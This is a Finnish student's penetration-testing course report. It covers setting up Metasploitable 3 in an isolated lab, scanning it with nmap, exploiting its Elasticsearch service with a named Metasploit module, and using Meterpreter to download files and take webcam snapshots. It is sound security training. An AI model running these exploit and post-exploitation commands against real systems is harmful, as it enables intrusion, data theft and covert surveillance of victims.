# H5 Script Kiddie
Niko Hukkanen **7.5.2022**

Haaga-Helia ammattikorkeakoulu

Kurssi: [Tunkeutumistestaus](https://terokarvinen.com/2021/penetration-testing-course-2022-spring/)

Kurssin opettaja: [Tero Karvinen](https://terokarvinen.com/contact)

## Harjoituksessa käytetyt laitteet ja järjestelmät

 - Lenovon Legion Y540 kannettava tietokone (Intel i7-9750H CPU, RAM 16GB, Nvidia GTX 1660 Ti GPU, Host OS: Win 11 )
 - Oracle VM VirtualBox 6.1.32.
 - VM: Kali Linux ja Metasploitable 3 Win/Ubuntu (ub1404 ja win2k8).

## v) Lue artikkelit ja katso videot, tee kustakin muistiinpanot (muutama ranskalainen viiva per artikkeli/video). Tässä v-kohdassa ei tarvitse tehdä mitään kokeita koneella.

**€ Jaswal 2020: Mastering Metasploit - 4ed:  [Chapter 1: Approaching a Penetration Test Using Metasploit](https://learning.oreilly.com/library/view/mastering-metasploit-/9781838980078/B15076_01_Final_ASB_ePub.xhtml#_idParaDest-30)  (kohdasta "Conducting a penetration test with Metasploit" luvun loppuun)**

 - Metasploitin komennoista lisää tietoa saa **help** tai **?**, kun se on ajossa.
 - Metasploitilla voidaan ajaa valmiita hyökkäyksiä, sekä valita "Payload" kuorma, jota käytetään hyökkäyksessä.
 - On myös mahdollista pyrkiä peittelemään hyökkäystä "Encoders" avulla, jotta hyökkäystä ei huomaisi palomuurit tai virustorjunta ohjelmistot.
 - Metasploitilla voidaan ajaa useampaa sessiota samanaikaisesti ja niitä voi siirtää taustalle pyörimään.
 - Metasploitista löytyy tietokanta, jossa on listattu erilaisia haavoittuvuuksia. Niitä voi etsiä komennolla: `search`, kun Metasploit on ajossa.
 - Meterpreter tarjoaa lisää funktioita ja ominaisuuksia, kuin vaikka esimerkiksi pelkkä etäyhteys kohdekoneeseen.
 - Meterpreterillä voidaan saada kohdejärjestelmän pääkäyttäjän oikeudet komennolla: `getsystem`.
 - Meterpreterillä voidaan selvittää lisätietoja kohdejärjestelmästä komennolla: `sysinfo`.
 - Lisätietoja Metasploitin käytöstä ja ominaisuuksista löytyy metasploitablen [GitHub sivustolta.](https://github.com/rapid7/metasploit-framework/wiki)

    
**Vapaavalintainen läpikävely (walktrough) yhdestä murrosta. Voit siis valita yhden läpikävelyn mistä tahansa näistä kanavista tai blogista. Kanavilla on muitakin artikkeleita, valitse tästä läpikävely. Keskity tiivistäessä asioihin, joita voisit itse soveltaa hyökätessä. Tässä on yli 200 h videota, niitä ei tarvitse katsoa kaikkia.**

**ippsec** [https://www.youtube.com/channel/UCa6eh7gCkpPo5XXUDfygQQA/videos](https://www.youtube.com/channel/UCa6eh7gCkpPo5XXUDfygQQA/videos)

Valitsin **ippsec** videoista yhden itseäni kiinnostavan videon: [Scriptkiddie](https://youtu.be/Yn3iGF8xMQI). Videon otsikko kuvasi hyvin tämän viikon läksyn otsikkoa.

- Aloittaessa hyökkäystä hyökkääjä skannaa avoimia portteja kohteesta Nmapin avulla.
- Tämän jälkeen portista 5000 löytyy python weppipalvelin, Weppipalvelimella pyörii palvelu, jossa on scriptkiddien oma websivusto. Tällä sivustolla voi ajaa Nmap, msfvenom ja searchsploit työkaluja.
- gobuster bruteforce työkalu, jonka avulla voidaan murtaa salasanoja.
- FuFF ohjelman käyttö sanojen etsimiseen, sekä liikenteen ohjaus proxyn kautta.
- Sivustolla olevien tyhjien tekstikenttien testaus mahdollisesta haavoittuvuudesta ajaa komentoja niiden sisällä.
- Verkkopalvelussa ajetaan msfvenom työkalua, josta löytyy haavoittuvuus searchploitin avulla.
- Löydetyn ja valmiiksi tehdyn hyökkäyksen muuttaminen toimivaksi.
- Reverseshell yhteyden muodostaminen nc avulla.
- Reverseshellin muokkaminen, jotta tekstieditori ohjelmat toimivat siinä.
- Koneessa on annettu yhdelle käyttäjälle mahdollisuus ajaa msf työkalua sudo oikeuksin.
- Metasploit työkalulla voidaan ajaa root oikeuksin komentoja suoraan työkalun sisältä, tai voidaan vaihtoehtoisesti käyttää interactive ruby shelliä.
- Kone saatiin lopulta korkattua Metasploitin avulla, käyttämällä siellä root käyttäjän oikeuksia hyväksi.
 
## a) Emmental. Asenna Metasploitable 3

Aluksi ajattelin tässä vaiheessa asentaa Metasploitable3 koneet Kali virtuaalikoneeni sisälle, mutta löysin paljon tietoa siitä, että virtuaalisointi virtuaalisoinnin sisällä ei ole helppoa. Tämän lisäksi siitä voi koitua paljon erilaisia turhia ongelmia. Joten päätin asentaa ohjelmat Windows 11 host koneelleni seuraavavien ohjeiden mukaan: [rtmoran](https://rtmoran.org/installing-metasploitable-3-windows-10/) ja [kalilinuxtutorials](https://kalilinuxtutorials.com/metasploitable3-on-windows/).

Latasin Vagrantin 2.2.19 version heidän [verkkosivuiltaan](https://www.vagrantup.com/downloads). 
Tämän jälkeen asensin Vagrantin ja käynnistin isäntäkoneen uudelleen.
Tässä vaiheessa olisi myös hyvä asentaa GIT ohjelmisto Git repon kloonaamiseen, itseltäni löytyi se jo asennettuna koneelleni. Kloonaaminen tapahtui komennolla: `git clone https://github.com/rapid7/metasploitable3.git`.

![metasploitable1](https://github.com/nikhuk/pentest/blob/main/assets/h5/metasploitable1.png?raw=true)

Latasin samalla packer nimisen ohjelman ja siitä version 1.8.0 [verkkosivuilta.](https://www.packer.io/downloads).

Ennen seuraavaa vaihetta jouduin muokkaamaan Windows isäntäkoneen Powershellissä scriptien ajamiseen liittyviä sääntöjä. Muokkasin niitä Microsoftin oman ohjeen mukaan, jonka löysin [täältä](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.security/set-executionpolicy?view=powershell-7.2). Alussa koneella ei ollut mahdollista ajaa scriptejä Powershellin tai cmd kautta, mutta kyseistä sääntöä voitiin muokata Powershellissä ohjeen mukaan.

Siirsin `packer.exe` ohjelman aiemmin GitHubista kloonnattuun metasploitable 3 kansioon. 
Tämän jälkeen ajoin komennon: `.\build.ps1 windows2008` Powershellissä.

![metasploitable](https://github.com/nikhuk/pentest/blob/main/assets/h5/metasploitable.png?raw=true)

Samalla myös asentui vagrant-reload plugin.
Asennuksessa haetaan käyttöjärjestelmä verkosta ja asennetaan se VirtualBoxiin.

![metasploitable3](https://github.com/nikhuk/pentest/blob/main/assets/h5/metasploitable3.png?raw=true)

Hetken kuluttua Windows virtuaalikone lähti asentumaan itsestään.
Itse asennuksessa meni noin 15 minuuttia.

![metasploitable4](https://github.com/nikhuk/pentest/blob/main/assets/h5/metasploitable4.png?raw=true)

Asennus onnistui ja olin saanut nyt virtuaalikoneen näkymään myös Virtualboxisssa.

Lopussa ajoin isäntä koneella komennon: `vagrant up` Samalla huomasin, että kyseinen komento lähti asentamaan Metasploitable3-Ubuntu konetta, sekä myös uudelleen lataamaan ja asentamaan Metasploitable3- Windows konetta. Annoin Vagrantin tehdä työtänsä ja asentaa molemmat Metasploitable3 koneet, koska ajattelin ettei siitä koituisi haittaa.

Windows Metasploitable3 koneen asennuksessa meni taas noin 20–30 minuuttia, koska se latasi iso kokoisen asennustiedoston verkosta. Tämän lisäksi Vagrant asensi koneen uudelleen omilla konfiguraatioilla.

![metasploitable5](https://github.com/nikhuk/pentest/blob/main/assets/h5/metasploitable5.png?raw=true)

Asennus onnistui ja molemmat koneet löytyivät VirtualBoxista ja Vagrantin sisältä. Kokeilin vielä tarkistaa Vagrantin olemassa olevat koneet komennolla: `vagrant box list`.

    vagrant box list
    debian/contrib-buster64       (virtualbox, 10.20210409.1)
    rapid7/metasploitable3-ub1404 (virtualbox, 0.1.12-weekly)
    rapid7/metasploitable3-win2k8 (virtualbox, 0.1.0-weekly)

Koneet näkyivät asennettuina täällä.

Lopussa poistin asennetuilta Metasploitable3 koneilta yhteyden internettiin.

Yhdistin Kali virtuaalikoneen ja Metasploitable3 koneet toisiinsa VirtualBoxin kautta Host-only adapterilla.

Lisättyäni koneet samaan verkkoon käynnistin ne samaan aikaan VirtualBoxista.

Lopuksi testasin Metasploitable3-Ubuntu koneen ja Kali virtuaalikoneeni yhteyttä `ping` komennolla.
Ennen `ping` komennon suorittamista selvitin molempien koneiden lähiverkon Ip-osoitteet komennolla: `ifconfig`.

![metasploitable6](https://github.com/nikhuk/pentest/blob/main/assets/h5/metasploitable6.png?raw=true)

Ping onnistui Kali virtuaalikoneesta Metasploitable3-Ubuntu virtuaalikoneeseen. Tein saman testin Metasploitable-3 virtuaalikoneesta Kali virtuaalikoneeseen, sekin myös toimi halutulla tavalla.

![metasploitable7](https://github.com/nikhuk/pentest/blob/main/assets/h5/metasploitable7.png?raw=true)

Lopussa testasin Metasploitable3 koneen yhteyttä Internettiin lähettämällä pingin osoitteeseen 8.8.8.8. Vastaukseksi sain connect: Network is uncreachable. Joten kone ei ole yhteydessä Internettiin enää aikaisemman Virtualbox adapteri muutoksen myötä.

Tein myös saman testin Metasploitable3 - Windows koneeseen.

![metasploitable8](https://github.com/nikhuk/pentest/blob/main/assets/h5/metasploitable8.png?raw=true)

Ping onnistui Metasploitable-Windows-server koneesta samassa verkossa olevaan Kali koneeseen.

## b) Msf. Murtaudu Metasploitable 3 käyttämällä Metasploittia 'sudo msfconsole'

Aloitin murtautumisen Nmap skannauksella Kali koneesta Metasploitable3-Windows koneeseen. Metasploitable3 koneen lähiverkon IP-osoitetta ei tarvinnut erikseen etsiä, koska se selvisi viime tehtävän lopussa tehdyssä yhteystestissä. Kohdensin Nmapin skannauksen täten koneen IP-osoitteeseen.
Ajoin tässä tapauksessa versio skannauksen Metasploitable 3 koneen palveluiden versioista komennolla: `sudo nmap -sV 192.168.56.5`.

![metasploit1](https://github.com/nikhuk/pentest/blob/main/assets/h5/metasploit1.png?raw=true)

Skannauksen tuloksena selvisi, että kyseinen kone on päällä ja tavoitettavissa. Tämän lisäksi selvisi 10 eri palvelun tila, sekä niiden palveluiden versiot. Samoin saatiin Metasploitable3-koneen MAC-osoite selville, sekä lisätietoja kohdekoneella ajettavasta käyttöjärjestelmästä.

Skannauksen jälkeen siirryin käyttämään ja etsimään lisätietoja avoimista palveluista Metasploitin avulla. Avasin Metasploitin komennolla: `sudo msfconsole`.
    
![metasploit2](https://github.com/nikhuk/pentest/blob/main/assets/h5/metasploit2.png?raw=true)

Kun sain Metasploitin käynnistettyä rupesin etsimään tietoa eri haavoittuvuuksista komennolla: `search <palvelunnimi>`.

Erityisesti kummastusta herättänyt portti 9200 ja sen palvelu alkoi kiinnostamaan, joten etsin Googlesta tietoa hakusanalla Metasploitable3 port 9200. Löysin seuraavanlaisen artikkelin [Learnin pentesting Metasploitable3](https://resources.infosecinstitute.com/topic/learning-pentesting-metasploitable3-exploiting-elasticsearch/). Huomasin samalla, että kyseessä on ohje siihen, kuinka tämän haavoittuvuuden käyttö tapahtuu. Päätin tässä vaiheessa käyttää kyseistä ohjetta, koska itse Metasploitable3 asennuksessa ja konfiguroinnissa meni niin kauan aikaa.

Ennen haavoittuvuuksien käyttöä ajoin kommenon: `sudo msfdb init` ohjeen mukaan, jotta saan käyttöön tietokannat.

![metasploit3](https://github.com/nikhuk/pentest/blob/main/assets/h5/metasploit3.png?raw=true)

Tämän jälkeen käynnistin jälleen msf konsolin komennolla: `sudo msfconsole`.
Päätin kohdistaa valmiin hyökkäyksen Elasticsearch palveluun ohjeen mukaan.
Otin hyökkäyksen käyttöön komennolla: `use exploit/multi/elasticsearch/script_mvel_rce`
Ajoin msfkonsolissa seuraavan komennon: `set RHOSTS 192.168.56.3`. Kohdekoneen IP-osoite
ja `set LHOST 192.168.56.4`. Lähdekoneen IP-osoite.
Lopuksi kohdensin hyökkäyksen porttiin 9200 komennolla: `set RPORT 9200`.

![metasploit4](https://github.com/nikhuk/pentest/blob/main/assets/h5/metasploit4.png?raw=true)

Sain haavoittuvuuden avulla kyseiseen Metasploitable3 koneeseen pääkäyttäjän oikeuden ja pystyin liikkumaan järjestelmän sisällä Meterpreterin avulla.

## c) Rat. Demonstroi meterpreter:n käyttöä

Aikaisemmassa tehtävässä sain käyttööni Meterpreterin. Meterpreter ei ollut minulle tuttu, joten lähdin etsimään siitä tietoa.  Löysin [artikkelin](https://www.offensive-security.com/metasploit-unleashed/meterpreter-basics/), jossa kerrotaan lisää sen käytöstä.
Päätin demonstroida Meterpreterin lataus ominaisuutta. Meterpreterin avulla voi ladata tiedostoja kohdekoneelta, johon on päästy sisään.
Loin Metasploitable3 koneelle tiedoston nimeltä `h5.txt` ja tallensin sen polkuun C:\ C-levylle.

![meterpreter2](https://github.com/nikhuk/pentest/blob/main/assets/h5/meterpreter2.png?raw=true)

Ajoin komennon: `ls`, jolla näin tiedostot c:\ päähakemistossa, sekä niiden käyttöoikeudet. Samalla näin myös luomani `h5.txt` tiedoston.

![meterpreter](https://github.com/nikhuk/pentest/blob/main/assets/h5/meterpreter.png?raw=true)

Meterpreterillä tiedoston lataaminen tapahtui seuraavanlaisesti: Annetaan komento `download` ja sen jälkeen polku, josta tiedosto ladataan. Tässä tapauksessa komento oli seuraavanlainen: `download c:\\h5.txt`.

Kun olin suorittanut latauksen siirryin Kali koneelleni tarkistamaan, onko kyseinen tiedosto saapunut ilmoitettuun paikkaan? `(/home/niko/h5.txt)`. Se löytyi käyttäjäni kotihakemistosta ilmoitetusta paikasta. Ajoin komennon: `cat h5.txt`.  

![meterpreter4](https://github.com/nikhuk/pentest/blob/main/assets/h5/meterpreter4.png?raw=true)

Se näytti samalta, kuin luomani tiedosto Metasploitable3-Windows koneella. Täten tiedoston lataus oli onnistunut Metapsloitable3 koneelta Kali koneelle.

Meterpreterin avulla on myös mahdollista siirtää palvelimelle tiedostoja, joten on mahdollista esimerkiksi siirtää tiedostoja tässä tapauksessa Kali koneesta Metasploitable3 koneeseen. Tämän avulla olisi mahdollista ladata haitallisia tiedostoja kaapatulle koneelle Meterpreterin avulla.

Toinen mielenkiintoinen ominaisuus Meterpreter työkalusta. löytyi Web-kameran kuvan sieppaamisesta. Komennolla: `webcam_snap` pystyi ottamaan kuvia kohdekoneen Web-kameralla. Kyseiset kuvat tallentuivat hyökkääjän koneelle suoraan.

## Lähteet

 - https://terokarvinen.com/2021/penetration-testing-course-2022-spring/
 - https://learning.oreilly.com/library/view/mastering-metasploit-/9781838980078/B15076_01_Final_ASB_ePub.xhtml#_idParaDest-30
 - https://github.com/rapid7/metasploit-framework/wiki
 - https://youtu.be/Yn3iGF8xMQI
 - https://rtmoran.org/installing-metasploitable-3-windows-10/
 - https://kalilinuxtutorials.com/metasploitable3-on-windows/
 - https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.security/set-executionpolicy?view=powershell-7.2
 - https://resources.infosecinstitute.com/topic/learning-pentesting-metasploitable3-exploiting-elasticsearch/
 - https://www.offensive-security.com/metasploit-unleashed/meterpreter-basics/